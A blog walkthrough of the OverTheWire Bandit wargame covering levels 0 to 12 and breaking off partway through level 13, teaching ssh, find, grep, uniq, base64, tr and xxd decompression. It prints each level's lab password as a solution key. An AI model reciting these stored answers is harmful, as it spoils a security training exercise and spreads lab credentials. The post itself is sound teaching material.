<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Over The Wire - Bandit Walkthrough :: Bruno Anjos</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Introduction Over The Wire provides multiple challenges focused on different topics of computer systems. The one which we will solve here is Bandit. This is focused on SSH communication, bash commands and some basic UNIX concepts.
So to connect to any of these levels you need 2 things: a username, and a password. Each level has a username in the format bandit&amp;lt;level_number&amp;gt; (without the &amp;lsquo;&amp;lt;&amp;rsquo; &amp;lsquo;&amp;gt;&amp;rsquo;) so for level 0 the username would be bandit0."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://bruno-anjos.github.io/posts/bandit/" />


<link rel="stylesheet" href="https://bruno-anjos.github.io/assets/style.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://bruno-anjos.github.io/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="https://bruno-anjos.github.io/img/favicon/orange.png">



<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Over The Wire - Bandit Walkthrough :: Bruno Anjos — " />
<meta name="twitter:description" content="Introduction Over The Wire provides multiple challenges focused on different topics of computer systems. The one which we will solve here is Bandit. This is focused on SSH communication, bash commands and some basic UNIX concepts.
So to connect to any of these levels you need 2 things: a username, and a password. Each level has a username in the format bandit&amp;lt;level_number&amp;gt; (without the &amp;lsquo;&amp;lt;&amp;rsquo; &amp;lsquo;&amp;gt;&amp;rsquo;) so for level 0 the username would be bandit0." />
<meta name="twitter:site" content="https://bruno-anjos.github.io/" />
<meta name="twitter:creator" content="Bruno Anjos" />
<meta name="twitter:image" content="">


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Over The Wire - Bandit Walkthrough :: Bruno Anjos — ">
<meta property="og:description" content="Introduction Over The Wire provides multiple challenges focused on different topics of computer systems. The one which we will solve here is Bandit. This is focused on SSH communication, bash commands and some basic UNIX concepts.
So to connect to any of these levels you need 2 things: a username, and a password. Each level has a username in the format bandit&amp;lt;level_number&amp;gt; (without the &amp;lsquo;&amp;lt;&amp;rsquo; &amp;lsquo;&amp;gt;&amp;rsquo;) so for level 0 the username would be bandit0." />
<meta property="og:url" content="https://bruno-anjos.github.io/posts/bandit/" />
<meta property="og:site_name" content="Over The Wire - Bandit Walkthrough" />
<meta property="og:image" content="">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta property="article:published_time" content="2019-06-28 00:00:00 &#43;0000 UTC" />











</head>
<body class="">


<div class="container full">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Bruno Anjos
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/posts">Posts</a></li>
        
      
        
          <li><a href="/showcase">Theme Showcase</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/posts">Posts</a></li>
      
    
      
        <li><a href="/showcase">Theme Showcase</a></li>
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://bruno-anjos.github.io/posts/bandit/">Over The Wire - Bandit Walkthrough</a></h1>
  <div class="post-meta">
      
    <span class="post-date">
      2019-06-28
    </span>
    
    
    <span class="post-author">::
      Bruno Anjos
    </span>
    
  </div>

  

  

  <div class="post-content">
    

<h1 id="introduction">Introduction</h1>

<p><a href="http://overthewire.org/wargames/">Over The Wire</a> provides multiple challenges focused on different topics of computer systems.
The one which we will solve here is Bandit. This is focused on SSH communication, bash commands and some basic UNIX concepts.</p>

<p>So to connect to any of these levels you need 2 things: a username, and a password. Each level has a username in the format <strong>bandit&lt;level_number&gt;</strong> (without the &lsquo;&lt;&rsquo; &lsquo;&gt;&rsquo;) so for level 0 the username would be <strong>bandit0</strong>. Then each level also has a password. Usually you find the password for the next level on the current one, this meaning that in level 0 you will find the password for level 1, which you will login with <strong>bandit1</strong> and the password you found.</p>

<p>You can read more about the challenge and how it works <a href="http://overthewire.org/wargames/bandit/">here</a>.</p>

<p>Levels:</p>

<ul>
<li><a href="#level0">Level 0</a></li>
<li><a href="#level1">Level 1</a></li>
<li><a href="#level2">Level 2</a></li>
<li><a href="#level3">Level 3</a></li>
<li><a href="#level4">Level 4</a></li>
<li><a href="#level5">Level 5</a></li>
<li><a href="#level6">Level 6</a></li>
<li><a href="#level7">Level 7</a></li>
<li><a href="#level8">Level 8</a></li>
<li><a href="#level9">Level 9</a></li>
<li><a href="#level10">Level 10</a></li>
<li><a href="#level11">Level 11</a></li>
<li><a href="#level12">Level 12</a></li>
<li><a href="#level13">Level 13</a></li>
<li><a href="#level14">Level 14</a></li>
<li><a href="#level15">Level 15</a></li>
<li><a href="#level16">Level 16</a></li>
<li><a href="#level17">Level 17</a></li>
<li><a href="#level18">Level 18</a></li>
<li><a href="#level19">Level 19</a></li>
<li><a href="#level20">Level 20</a></li>
<li><a href="#level21">Level 21</a></li>
<li><a href="#level22">Level 22</a></li>
<li><a href="#level23">Level 23</a></li>
<li><a href="#level24">Level 24</a></li>
<li><a href="#level25">Level 25</a></li>
</ul>

<h2 id="level-0-http-overthewire-org-wargames-bandit-bandit0-html"><a href="http://overthewire.org/wargames/bandit/bandit0.html">Level 0</a></h2>

<p><a name="level0"></p>

<p>So we need to login as <strong>bandit0</strong> using the password <strong>bandit0</strong> at <strong>bandit.labs.overthewire.org</strong> using SSH. It&rsquo;s also said that the connection should be done to port <strong>2220</strong>.</p>

<p>We can use the <strong>man</strong> command followed by <strong>ssh</strong> to get information on how to use ssh. The <strong>man</strong> command is super useful, but sometimes can present you with more information then you need. A nice alternative is the <strong>tldr</strong> command which you can install through your package manager (have in mind that you won&rsquo;t be able to use it once you login through ssh since you can&rsquo;t install anything in the bandit machine). It also takes the command that you want to see more information as an argument but it shows you some examples frequently used. So by doing <code>tldr ssh</code> we get one of the lines saying</p>

<pre><code class="language-bash">- Connect to a remote server using a specific port:                    
  ssh username@remote_host -p 2222
</code></pre>

<p>which we can change with the arguments we have, resulting in <code>ssh bandit0@bandit.labs.overthewire.org -p 2220</code>. Now we know how to make a basic ssh connection with a username and a port. After we execute the command a password is asked. We insert <strong>bandit0</strong> and finally we have an open ssh connection, which we can see by the prompt <code>bandit0@bandit:~$</code>.</p>

<p>Ok now we can go to the next level.</p>

<h2 id="level-1-http-overthewire-org-wargames-bandit-bandit1-html"><a href="http://overthewire.org/wargames/bandit/bandit1.html">Level 1</a></h2>

<p><a name="level1"></p>

<p>We will use the connection established in <a href="#level0">Level 0</a> to solve this level. They say that the password for the next level is stored in the file called <strong>readme</strong>. To print the content of the file we can use the <code>cat</code> command which takes the file you want to see.</p>

<pre><code class="language-bash">bandit0@bandit:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
</code></pre>

<p>So now that we have the password we can go to the next level.</p>

<h2 id="level-2-http-overthewire-org-wargames-bandit-bandit2-html"><a href="http://overthewire.org/wargames/bandit/bandit2.html">Level 2</a></h2>

<p><a name="level2"></p>

<p>In this level the password is in a file called <code>-</code>. The problem here is that the character <code>-</code> is used as a special character to represent stdin (<a href="https://unix.stackexchange.com/questions/16357/usage-of-dash-in-place-of-a-filename">more information on this here</a>), so in this case we should be able to see its content if we specify the filename in a path format like</p>

<pre><code class="language-bash">bandit1@bandit:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
</code></pre>

<p>The <code>.</code> means the current directory, so what we are representing is the current directory, which inside has a file named <code>-</code>.</p>

<h2 id="level-3-http-overthewire-org-wargames-bandit-bandit3-html"><a href="http://overthewire.org/wargames/bandit/bandit3.html">Level 3</a></h2>

<p><a name="level3"></p>

<p>So now the file that we want to see is called <code>spaces in this filename</code>. The challenge here is that if we do like before and use the command <strong>cat</strong> followed by the name we get this</p>

<pre><code class="language-bash">bandit2@bandit:~$ cat spaces in this filename 
cat: spaces: No such file or directory
cat: in: No such file or directory
cat: this: No such file or directory
cat: filename: No such file or directory
</code></pre>

<p>Wait what???</p>

<p>So the problem here is that as we&rsquo;ve seen before commands take arguments so what we are doing is calling the <strong>cat</strong> command with 4 arguments: <strong>spaces</strong>, <strong>in</strong>, <strong>this</strong> and <strong>filename</strong>. This is not what we want at all. What we want is to print the file named <code>spaces in this filename</code>. So the way to do it is to give it to the command as a whole string by surrounding it with <code>&quot;</code>.</p>

<pre><code class="language-bash">bandit2@bandit:~$ cat &quot;spaces in this filename&quot; 
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
</code></pre>

<p>Onto the next level.</p>

<h2 id="level-4-http-overthewire-org-wargames-bandit-bandit4-html"><a href="http://overthewire.org/wargames/bandit/bandit4.html">Level 4</a></h2>

<p><a name="level4"></p>

<p>Now the file that contains the password is a hidden file and is in the <code>inhere</code> directory. To change directory we use the <strong>cd</strong> command.</p>

<pre><code class="language-bash">bandit3@bandit:~$ cd inhere
</code></pre>

<p>Now we know that we are in the <code>inhere</code> directory because the bash prompt says it <code>bandit3@bandit:~/inhere$</code>.</p>

<p>If we list the files in the current directory, which we can do by executing the command <code>ls</code> we get a blank listing.</p>

<pre><code class="language-bash">bandit3@bandit:~/inhere$ ls
bandit3@bandit:~/inhere$ 
</code></pre>

<p>Ok it makes sense. The challenge said that the file was hidden. You can search a bit about hidden files in UNIX systems and you will eventually find out that by convention the hidden files start with a <code>.</code>. To list hidden files you can do <code>man ls</code> and see that there is a flag that you can pass to list <strong>all</strong> entries, not ignoring those starting with <code>.</code> (to quit <strong>man</strong> simply hit <strong>q</strong>).</p>

<pre><code class="language-bash">bandit3@bandit:~/inhere$ ls -a
.  ..  .hidden
</code></pre>

<p>Ok as we can see there is a file named <code>.hidden</code> that should be the one (the other two <code>.</code>, <code>..</code> are the current directory and the parent directory respectively).</p>

<pre><code class="language-bash">bandit3@bandit:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
</code></pre>

<p>So by using <strong>cat</strong> with the filename we can then get the password for the next level.</p>

<h2 id="level-5-http-overthewire-org-wargames-bandit-bandit5-html"><a href="http://overthewire.org/wargames/bandit/bandit5.html">Level 5</a></h2>

<p><a name="level5"></p>

<p>So now the password is stored in the only human-readable file in the <code>inhere</code> directory. As we&rsquo;ve seen before to change directory we can use the <strong>cd</strong> command. Then we can list the files in the current directory by using ls (i use the <strong>-l</strong> flag just to display it as a vertical listing).</p>

<pre><code class="language-bash">bandit4@bandit:~/inhere$ ls -l
total 40
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file00
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file01
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file02
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file03
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file04
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file05
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file06
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file07
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file08
-rw-r----- 1 bandit5 bandit4 33 Oct 16  2018 -file09
</code></pre>

<p>Ok so we have 10 files. The listing doesn&rsquo;t tells us much about them. On the other hand one of suggested commands <strong>file</strong> can tell us interesting things about each file, maybe know which one is human-readable we hope. So what we can do is calling <strong>file</strong> on all the files in this directory. There are two ways to do this: the bruteforce way and the smart way. The bruteforce way is to run <code>file -fileXX</code> (replacing XX for the file number) for each file in the directory. The smart way is to use the symbol <code>*</code> that matches with every file name, this meaning that using <code>*</code> or every filename separated by spaces is the same.</p>

<pre><code class="language-bash">bandit4@bandit:~/inhere$ file *
file: Cannot open `ile00' (No such file or directory).
file: Cannot open `ile01' (No such file or directory).
file: Cannot open `ile02' (No such file or directory).
file: Cannot open `ile03' (No such file or directory).
file: Cannot open `ile04' (No such file or directory).
file: Cannot open `ile05' (No such file or directory).
file: Cannot open `ile06' (No such file or directory).
file: Cannot open `ile07' (No such file or directory).
file: Cannot open `ile08' (No such file or directory).
file: Cannot open `ile09' (No such file or directory).
</code></pre>

<p>&ldquo;Wait&hellip; You said this was the smart way and it didn&rsquo;t work, that doesn&rsquo;t very smart to me.&rdquo; I know, i know just give me a chance. So the problem here is that the files begin by a <code>-</code>, and we&rsquo;ve encountered this problem before. Let&rsquo;s do as we did before by putting the filenames in a path like format, so <code>./*</code>.</p>

<pre><code class="language-bash">bandit4@bandit:~/inhere$ file ./*
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
</code></pre>

<p>Ohhh so now it worked, okay. This tells us that the only file that has an <code>ASCII text</code> type is <code>-file07</code>. This is the one.</p>

<p>So we use <strong>cat</strong> no surprise there and we get</p>

<pre><code class="language-bash">bandit4@bandit:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
</code></pre>

<p>Done. Next level.</p>

<h2 id="level-6-http-overthewire-org-wargames-bandit-bandit6-html"><a href="http://overthewire.org/wargames/bandit/bandit6.html">Level 6</a></h2>

<p><a name="level6"></p>

<p>So now the password is in a file stored in the <code>inhere</code> directory and has three properties:</p>

<ul>
<li>human-readable</li>
<li>1033 bytes in size</li>
<li>not executable</li>
</ul>

<p>So lets <strong>cd</strong> onto <code>inhere</code> and the list its content.</p>

<pre><code class="language-bash">bandit5@bandit:~/inhere$ ls -l
total 80
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere00
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere01
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere02
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere03
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere04
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere05
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere06
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere07
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere08
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere09
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere10
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere11
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere12
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere13
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere14
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere15
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere16
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere17
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere18
drwxr-x--- 2 root bandit5 4096 Oct 16  2018 maybehere19
</code></pre>

<p>Ok so here bruteforce might not be worth it since each of those entries is a directory and has multiple files. We can use one of the suggested commands named <strong>find</strong> which, guess what, finds stuff.</p>

<p>So to learn a bit about find you can use <strong>man</strong> and just so you know you can search words in <strong>man</strong> by hitting <strong>/</strong> and then typing the word you want to lookup. We can lookup <code>size</code> and <code>readable</code> in there which will give us 2 flags to use: <code>-size</code> and <code>-readable</code>. <code>-size</code> works with the number of units you want followed by the character that represents the unit. So in our case we want 1033 bytes, so the result will be <code>-size 1033c</code>. The readable flag needs no argument. The final command is:</p>

<pre><code class="language-bash">bandit5@bandit:~/inhere$ find -size 1033c -readable
./maybehere07/.file2
</code></pre>

<p><strong>find</strong> searches by default in your current directory. The result is only one file so we don&rsquo;t need to care about it being executable or not.</p>

<pre><code class="language-bash">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
</code></pre>

<p>Onto the next level.</p>

<h2 id="level-7-http-overthewire-org-wargames-bandit-bandit7-html"><a href="http://overthewire.org/wargames/bandit/bandit7.html">Level 7</a></h2>

<p><a name="level7"></p>

<p>In this level the password is stored <strong>somewhere in the server</strong> with a few properties:</p>

<ul>
<li>owned by user bandit7</li>
<li>owned by group bandit6</li>
<li>33 bytes in size</li>
</ul>

<p><strong>find</strong> should do the job here as well, it&rsquo;s just a matter of finding the flags associated with the functionalities. We already know how to use the <code>-size</code> so that&rsquo;s going to be <code>-size 33c</code>. After digging a bit in the <strong>man</strong>, we can see that <code>-user</code> and <code>-group</code> do what we want.</p>

<pre><code class="language-bash">bandit6@bandit:~$ find -user bandit7 -group bandit6 -size 33c
bandit6@bandit:~$
</code></pre>

<p>Wait&hellip; No file matched what we wanted. The trick here is that it says <strong>somewhere in the server</strong> so to search everywhere and not just the current directory we have to give the <code>/</code> directory (which is the root) as an argument to <strong>find</strong>.</p>

<pre><code class="language-bash">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c
find: ‘/run/lvm’: Permission denied
(...more...)
find: ‘/var/cache/apt/archives/partial’: Permission denied
/var/lib/dpkg/info/bandit7.password
find: ‘/var/lib/apt/lists/partial’: Permission denied
(...more...)
find: ‘/boot/lost+found’: Permission denied
</code></pre>

<p>Well as you can see there are a lot of errors but the file is there. If you want to clean it up you can redirect the error output to <code>/dev/null</code> so the errors don&rsquo;t show up.</p>

<pre><code class="language-bash">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt; /dev/null
/var/lib/dpkg/info/bandit7.password
</code></pre>

<p>Ok so we found the file. We just need to use <strong>cat</strong> and we should get the password.</p>

<pre><code class="language-bash">bandit6@bandit:~$ cat $(find / -user bandit7 -group bandit6 -size 33c 2&gt; /dev/null)
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
</code></pre>

<p>Quick note, what i did in the previous command was telling bash that <strong>cat</strong> took the result of another command (<strong>find</strong>) as an argument, we do this by surrounding it with <code>$()</code>. This tells bash that what&rsquo;s inside is not only text, it&rsquo;s actually a command. So then the resulting output of the <strong>find</strong> command <code>/var/lib/dpkg/info/bandit7.password</code> will be an argument to <strong>cat</strong>.</p>

<h2 id="level-8-http-overthewire-org-wargames-bandit-bandit8-html"><a href="http://overthewire.org/wargames/bandit/bandit8.html">Level 8</a></h2>

<p><a name="level8"></p>

<p>New challenge. The password is stored in the file <code>data.txt</code> next to the word <code>millionth</code>. Ok so let&rsquo;s see the content of the file.</p>

<pre><code class="language-bash">bandit7@bandit:~$ cat data.txt
humiliation's   47r0YuNylaQ3k6HqGF5NsPPiGuolDCjn
malarkey's      0huyJeRwvtJaoyRmJjQFsRnQcYG4gDir
(...A LOT MORE...)
chemical        7D5J0CAJMWr2Ryb9uB0kSRuqz7BQPv6X
shaded  v5MBdtwMnmZ9YlheYVOxBJiOSxp9BeAA
</code></pre>

<p>We won&rsquo;t be able to find this just by seeing the file&rsquo;s content, we will need some sort of finder, but for a file&rsquo;s content. So once again we will see the suggested commands, and one that fits our needs is <strong>grep</strong>. Now a way we can do this is by using the file&rsquo;s content as the content to look in. On the <strong>man grep</strong> page it says that you can pass the file as an argument, the other way is that if you don&rsquo;t specify a file <strong>grep</strong> will use the standard input. So the first way of doing this is:</p>

<pre><code class="language-bash">bandit7@bandit:~$ grep millionth data.txt 
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
</code></pre>

<p>Easy. Another way that teaches you a few other concepts is doing it like this:</p>

<pre><code class="language-bash">bandit7@bandit:~$ cat data.txt | grep millionth
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
</code></pre>

<p>What we are doing here is called pipelining commands. What it does is using the output of the first command as the input of the second one, so <strong>grep</strong> will use the standard input (which will be the output produced by <strong>cat</strong>) to search the term <code>millionth</code>.</p>

<p>Onto the next level.</p>

<h2 id="level-9-http-overthewire-org-wargames-bandit-bandit9-html"><a href="http://overthewire.org/wargames/bandit/bandit9.html">Level 9</a></h2>

<p><a name="level9"></p>

<p>Now the password is still stored in <code>data.txt</code> but now they say is the only line that is unique.
We will <strong>cat</strong> the file just to see its content</p>

<pre><code class="language-bash">bandit8@bandit:~$ cat data.txt 
KerqNiDbY0zV2VxnOCmWX5XWxumldlAe
MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET
(...more...)
YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE
DXI6y5CNPU06rVpkoZgnZJBWfkdW131j
</code></pre>

<p>So once again we won&rsquo;t be able to get the unique line without using a few tools.
There is a suggested command named <code>uniq</code>, sounds like what we need by checking the <strong>man</strong> page.
So the way to use the command is by passing the flag <code>-u</code> that tells <code>uniq</code> to only print unique lines.</p>

<pre><code class="language-bash">bandit8@bandit:~$ uniq -u data.txt                    
KerqNiDbY0zV2VxnOCmWX5XWxumldlAe
MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET
(...more...)
YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE
DXI6y5CNPU06rVpkoZgnZJBWfkdW131j
</code></pre>

<p>Wait&hellip; It gave us the same. Let&rsquo;s check the <strong>man</strong> page again.</p>

<pre><code class="language-bash">NAME
       uniq - report or omit repeated lines

SYNOPSIS
       uniq [OPTION]... [INPUT [OUTPUT]]

DESCRIPTION
       Filter adjacent matching lines from INPUT (or standard input), writing to OUTPUT (or standard output).
</code></pre>

<p>Ok then. So it only filters <strong>adjacent matching lines</strong>. So what we could do is sort the lines so that all the repeated lines be adjacent to one another. Guess what, one of the suggested commands is <strong>sort</strong>, that should do it. We look a bit into the <strong>man</strong> page to see how it works and is nothing special, <strong>sort</strong> followed by the file name. Now <strong>sort</strong> writes to the standard output so what we can do is pipelining, check <a href="level8">Level 8</a> for more information on this.</p>

<pre><code class="language-bash">bandit8@bandit:~$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
</code></pre>

<p>Ok there we go. We have the password, let&rsquo;s go to the next level.</p>

<h2 id="level-10-http-overthewire-org-wargames-bandit-bandit10-html"><a href="http://overthewire.org/wargames/bandit/bandit10.html">Level 10</a></h2>

<p><a name="level10"></p>

<p>Now the password is stored in the file <code>data.txt</code> and is one of the few human-readable strings, beginning with several <code>=</code> characters. Now we already know what a few of the suggested commands do, so we know they&rsquo;re not quite what we want. Let&rsquo;s check out <strong>strings</strong>.</p>

<pre><code class="language-bash">NAME
       strings - print the strings of printable characters in files.
</code></pre>

<p>Ok. We can try combining <strong>strings</strong> with <strong>grep</strong> in order to get only the strings that have a <code>=</code>.</p>

<pre><code class="language-bash">bandit9@bandit:~$ strings data.txt | grep =
2========== the
========== password
&gt;t=     yP
rV~dHm=
========== isa
=FQ?P\U
=       F[
pb=x
J;m=
=)$=
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
iv8!=
</code></pre>

<p>Ok we can assume the password is the penultimate line, minus the <code>=</code>s of course.</p>

<h2 id="level-11-http-overthewire-org-wargames-bandit-bandit11-html"><a href="http://overthewire.org/wargames/bandit/bandit11.html">Level 11</a></h2>

<p><a name="level11"></p>

<p>Now the password is still stored in <code>data.txt</code> but encoded with base64. There is a suggested command named <code>base64</code> that might be useful.</p>

<pre><code class="language-bash">NAME
       base64 - base64 encode/decode data and print to standard output
</code></pre>

<p>Ok, it can decode base64 so that should do it. To decode we use the <code>-d</code> flag.</p>

<pre><code class="language-bash">bandit10@bandit:~$ base64 -d data.txt 
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
</code></pre>

<p><em>DJ Khaled Voice:</em> Another one</p>

<h2 id="level-12-http-overthewire-org-wargames-bandit-bandit12-html"><a href="http://overthewire.org/wargames/bandit/bandit12.html">Level 12</a></h2>

<p><a name="level12"></p>

<p>The password is stored in the file <code>data.txt</code>, but all lowercase and uppercase letters have been rotated 13 positions. This is called ROT13 (you can google it to get some more information on this). It&rsquo;s a ceasar&rsquo;s cipher with the <strong>n</strong> equal to 13 (you can google this as well). So by checking out the suggested commands there are a few that we already know that are not suitable for this. One of the new ones is <strong>tr</strong>. Let&rsquo;s check the <strong>man</strong> page.</p>

<pre><code class="language-bash">NAME
       tr - translate or delete characters
</code></pre>

<p>Ok. So it translates characters. I guess that&rsquo;s what we kind of want. We want to translate &lsquo;a&rsquo; to 13 positions ahead. So a quick google of <code>tr ROT13</code> would land us on the <a href="https://en.wikipedia.org/wiki/ROT13">Wikipedia page</a>. In the page there is an implementation of ROT13 using <strong>tr</strong>. We can kind of reverse engineer it and get what we want. This is the way to encode <code>tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>, so to decode it should be the other way around right? <code>tr 'N-ZA-Mn-za-m' 'A-Za-z'</code></p>

<p>Well let&rsquo;s try it. <strong>tr</strong> uses the standard input, so we will pipeline it using <strong>cat</strong>.</p>

<pre><code class="language-bash">bandit11@bandit:~$ cat data.txt | tr 'N-ZA-Mn-za-m' 'A-Za-z'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
</code></pre>

<p>Perfect. Next level.</p>

<h2 id="level-13-http-overthewire-org-wargames-bandit-bandit13-html"><a href="http://overthewire.org/wargames/bandit/bandit13.html">Level 13</a></h2>

<p><a name="level13"></p>

<p>Let&rsquo;s see the challenge description,</p>

<blockquote>
<p>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p>
</blockquote>

<p>Ok understood. Let&rsquo;s follow the useful tips.</p>

<pre><code class="language-bash">bandit12@bandit:~$ mkdir /tmp/dirforfiles
</code></pre>

<p>Now we have a directory to work with our files. Let&rsquo;s copy our file in there first</p>

<pre><code class="language-bash">bandit12@bandit:~$ cp data.txt /tmp/dirforfiles
</code></pre>

<p>Done. Let&rsquo;s change our current directory to the one we created.</p>

<pre><code class="language-bash">bandit12@bandit:~$ cd /tmp/dirforfiles
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre>

<p>So they said that the file was a hexdump let&rsquo;s check <strong>xxd</strong>&rsquo;s <strong>man</strong> page.</p>

<pre><code class="language-bash">NAME
       xxd - make a hexdump or do the reverse.
</code></pre>

<p>Ok what we want is to reverse it back to it&rsquo;s original state. We use the <code>-r</code> flag to do this.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ xxd -r data.txt 
�▒▒h��6��@4▒bi���h▒91AY&amp;SY���������ϟ���������������׽��9��
    �mF�h�h44
▒��B��,0��   ��4@�����@2▒C@h�� �
�ɋ�^-K�����}�\,�▒ǿ�}E�F�_!r�U�g?E�i��9x��TB@�lȲ���BF.hM�SC4�V�F��R�Br&quot;�&lt;(Hت$    $���KBs��%l▒~�_�▒ݿ����g�zM�w�#P&quot;2@������

��\��WQO4�p�i�����S�#&amp;��/�#��[j▒�&lt;D�uԐ^_�H.�-��wAt
                                                  �[��UP�G�CP��&amp;:�2�*�)�\�������H�
�\�7��w&lt;bandit12@bandit:/tmp/dirforfiles$
</code></pre>

<p>Ok. I think i broke it&hellip; So what happened was that <strong>xxd</strong> reversed it back to a binary but wrote the result to the standard output. Let&rsquo;s redirect it to a file.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ xxd -r data.txt &gt; original
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre>

<p>Ok. It worked. Let&rsquo;s check what we are dealing with by using the <strong>file</strong> command to check some more information on the file we just created.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file original 
original: gzip compressed data, was &quot;data2.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
</code></pre>

<p>So it&rsquo;s a gzip file, let&rsquo;s learn how to decompress it by checking <strong>man gzip</strong>. So there is a flag <code>-d</code> that is used to decompress, let&rsquo;s do it.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ gzip -d original
gzip: original: unknown suffix -- ignored
</code></pre>

<p>Hmmm&hellip; Weird. The suffix is what goes at the end of the filename i guess&hellip; OH RIGHT the file extension. This file has no extension and <strong>gzip</strong> doesn&rsquo;t like it. Let&rsquo;s give it a proper name.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ mv original original.gz
</code></pre>

<p>Ok now let&rsquo;s try it again.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ gzip -d original.gz 
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre>

<p>Ok no error. It worked i assume. Now we can list the dir to see what we have.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ ls -la
total 1896
drwxr-sr-x     2 bandit12 root    4096 Jun 29 16:12 .
drwxrws-wt 54536 root     root 1925120 Jun 29 16:14 ..
-rw-r-----     1 bandit12 root    2581 Jun 29 16:04 data.txt
-rw-r--r--     1 bandit12 root     572 Jun 29 16:09 original
</code></pre>

<p>Ok so the file named <code>original</code> is the result of the decompression. Let&rsquo;s analyze it again with the <strong>file</strong> command.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file original 
original: bzip2 compressed data, block size = 900k
</code></pre>

<p>So now it&rsquo;s compressed with <strong>bzip2</strong>. TO THE <strong>MAN</strong> PAGE!</p>

<p>Once again the <code>-d</code> flag does it.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ bzip2 -d original
bzip2: Can't guess original name for original -- using original.out
</code></pre>

